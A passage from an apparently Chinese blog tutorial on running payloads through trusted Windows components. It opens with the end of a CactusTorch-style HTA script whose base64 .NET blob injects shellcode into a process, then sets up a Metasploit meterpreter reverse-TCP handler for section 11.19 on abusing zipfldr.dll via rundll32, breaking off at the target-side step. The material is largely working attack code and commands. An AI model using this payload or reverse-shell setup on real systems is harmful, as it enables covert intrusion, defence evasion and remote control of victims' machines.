s = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy" s = s &amp; "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph" s = s &amp; "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk" s = s &amp; "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD" s = s &amp; "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl" s = s &amp; "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU" s = s &amp; "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl" s = s &amp; "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90" s = s &amp; "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu" s = s &amp; "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH" s = s &amp; "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA" s = s &amp; "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw" s = s &amp; "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu" s = s &amp; "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA" s = s &amp; "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u" s = s &amp; "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5" s = s &amp; "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR" s = s &amp; "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA" s = s &amp; "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y" s = s &amp; "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh" s = s &amp; "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz" s = s &amp; "ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy" s = s &amp; "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA" s = s &amp; "AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA" s = s &amp; "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA" s = s &amp; "AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA" s = s &amp; "AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA" s = s &amp; "AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA" s = s &amp; "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT" s = s &amp; "MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA" s = s &amp; "Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME" s = s &amp; "EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK" s = s &amp; "ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK" s = s &amp; "EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA" s = s &amp; "BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC" s = s &amp; "fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP" s = s &amp; "AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj" s = s &amp; "fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB" s = s &amp; "AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA" s = s &amp; "ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF" s = s &amp; "kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG" s = s &amp; "AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I" s = s &amp; "qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK" s = s &amp; "ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB" s = s &amp; "AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG" s = s &amp; "AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB" s = s &amp; "AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW" s = s &amp; "gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD" s = s &amp; "AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG" s = s &amp; "ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I" s = s &amp; "+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW" s = s &amp; "gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA" s = s &amp; "EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW" s = s &amp; "IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg" s = s &amp; "1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+" s = s &amp; "BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA" s = s &amp; "BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA" s = s &amp; "AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA" s = s &amp; "CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB" s = s &amp; "AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG" s = s &amp; "KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ" s = s &amp; "ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA" s = s &amp; "hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ" s = s &amp; "AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA" s = s &amp; "5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ" s = s &amp; "AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB" s = s &amp; "aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu" s = s &amp; "ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA" s = s &amp; "WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB" s = s &amp; "AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA" s = s &amp; "AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN" s = s &amp; "b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S" s = s &amp; "RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU" s = s &amp; "RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP" s = s &amp; "TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB" s = s &amp; "VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF" s = s &amp; "VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT" s = s &amp; "X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP" s = s &amp; "VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP" s = s &amp; "UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ" s = s &amp; "VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU" s = s &amp; "WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD" s = s &amp; "UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP" s = s &amp; "Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J" s = s &amp; "Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X" s = s &amp; "SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO" s = s &amp; "SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy" s = s &amp; "ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs" s = s &amp; "cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl" s = s &amp; "cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW" s = s &amp; "YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1" s = s &amp; "dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh" s = s &amp; "ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli" s = s &amp; "dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0" s = s &amp; "cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz" s = s &amp; "ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5" s = s &amp; "Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3" s = s &amp; "WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI" s = s &amp; "RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n" s = s &amp; "AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD" s = s &amp; "VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz" s = s &amp; "SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ" s = s &amp; "bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT" s = s &amp; "ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt" s = s &amp; "ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp" s = s &amp; "bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp" s = s &amp; "YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh" s = s &amp; "Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU" s = s &amp; "ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB" s = s &amp; "ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk" s = s &amp; "SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ" s = s &amp; "cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5" s = s &amp; "AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX" s = s &amp; "AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE" s = s &amp; "IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD" s = s &amp; "Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE" s = s &amp; "IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA" s = s &amp; "AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg" s = s &amp; "BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS" s = s &amp; "DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB" s = s &amp; "AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT" s = s &amp; "VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3" s = s &amp; "NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA" s = s &amp; "ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A" s = s &amp; "VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA" s = s &amp; "AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA" s = s &amp; "BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs" s = s &amp; "AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA" s = s &amp; "cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA" s = s &amp; "AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA" s = s &amp; "UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu" s = s &amp; "ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA" s = s &amp; "SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV" s = s &amp; "AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA" s = s &amp; "AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP" s = s &amp; "AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA" s = s &amp; "VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw" s = s &amp; "AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA" s = s &amp; "LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" s = s &amp; "AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv" s = s &amp; "bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA" entry_class = "cactusTorch"
Dim fmt, al, d, o Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter") Set al = CreateObject("System.Collections.ArrayList") al.Add fmt.SurrogateSelector
Set d = fmt.Deserialize_2(Base64ToStream(s)) Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class) o.flame binary,code End Sub
SetVersion On Error Resume Next Run If Err.Number &lt;&gt; 0 Then Debug Err.Description Err.Clear End If
self.close &lt;/script&gt;
</code></pre>
<hr>
<h2><a id="1119_zipfldrdllpayload_2796"></a>11.19 基于白名单zipfldr.dll执行payload（十八）</h2>
<pre><code class="prism language-c">zipfldr<span class="token punctuation">.</span>dll简介：
</code></pre>
<p>zipfldr.dll自Windows xp开始自带的zip文件压缩/解压工具组件。</p>
<p>说明：zipfldr.dll所在路径已被系统添加PATH环境变量中，因此，zipfldr.dll命令可识别，但由于为dll文件，需调用rundll32.exe来执行。</p>
<p>Windows 2003 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\zipfldr<span class="token punctuation">.</span>dll
C<span class="token punctuation">:</span>\Windows\SysWOW64\zipfldr<span class="token punctuation">.</span>dll
</code></pre>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\zipfldr<span class="token punctuation">.</span>dll
C<span class="token punctuation">:</span>\Windows\SysWOW64\zipfldr<span class="token punctuation">.</span>dll
</code></pre>
<p>攻击机：<br>
192.168.1.4 Debian</p>
<p>靶机：<br>
192.168.1.3 Windows 7<br>
192.168.1.3 Windows 2003</p>
<p><strong>配置攻击机msf：</strong></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port 

Exploit target<span class="token punctuation">:</span> 

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020101023374419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
